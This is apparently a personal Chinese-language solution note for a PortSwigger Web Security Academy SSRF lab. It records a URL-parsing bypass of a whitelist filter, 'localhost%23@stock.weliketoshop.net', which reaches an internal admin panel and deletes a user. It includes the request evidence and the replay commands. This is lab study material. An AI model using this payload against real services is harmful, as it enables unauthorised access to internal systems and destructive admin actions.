---
title: "lab-ssrf-with-whitelist-filter"
links:
  - target: ssrf-family
    relation: evidences
---

# lab-ssrf-with-whitelist-filter

> evidences: [[ssrf-family]]

- 题面:SSRF with whitelist-based input filter(/web-security/ssrf/lab-ssrf-with-whitelist-filter)
- 实例:https://0a8d00cf0432a854802ac11000910045.web-security-academy.net
- slug(真):请求路径带 `/blind/` 段会 404;真 slug 为 `/web-security/ssrf/lab-ssrf-with-whitelist-filter`
- 判定目标:用 SSRF 取 `http://localhost/admin` 并删 `carlos`;状态:**solved**(solved_check true)

## 关键步

1. 商品页有 `stockCheckForm` → POST `/product/stock`,`stockApi` 参数默认
   `http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1`。
2. `stockApi=http://localhost/admin` → 400 `"External stock check host must be stock.weliketoshop.net"`
   (`stock.weliketoshop.net@localhost/admin` 也被拒——它解析的是 host)。
3. **绕过(`%23`=# 造成校验/fetch 的解析分歧)**:
   `stockApi=http://localhost%23@stock.weliketoshop.net/admin`
   校验侧把 host 认成 `stock.weliketoshop.net`(通过),而取回时落到 `localhost` → 200 回显 admin 面板
   (Users: wiener / carlos,含 `/admin/delete?username=carlos`)。
4. 收口:`stockApi=http://localhost%23@stock.weliketoshop.net/admin/delete?username=carlos` → 302 `/admin`。

## 证据摘录

```
POST /product/stock stockApi=http://localhost%23@stock.weliketoshop.net/admin
 -> 200 <h1>Users</h1> … wiener … carlos …
POST /product/stock stockApi=http://localhost%23@stock.weliketoshop.net/admin/delete?username=carlos
 -> 302 Location: /admin
solved_check “<inst>/” --jar /tmp/b16-jar3.json -> {"solved":true}
```

## 复现命令

```
lab_launch launch 7E946E5CC74A1C4DF272BA01DF0415B53548E0DFDB326D35F1D58E9B38DCBDA4 --widget-source /web-security/ssrf --jar /tmp/b16-jar3.json
lab_http post "<inst>/product/stock" --jar /tmp/b16-jar3.json --form "stockApi=http://localhost%23@stock.weliketoshop.net/admin"
lab_http post "<inst>/product/stock" --jar /tmp/b16-jar3.json --form "stockApi=http://localhost%23@stock.weliketoshop.net/admin/delete?username=carlos"
solved_check "<inst>/" --jar /tmp/b16-jar3.json
```
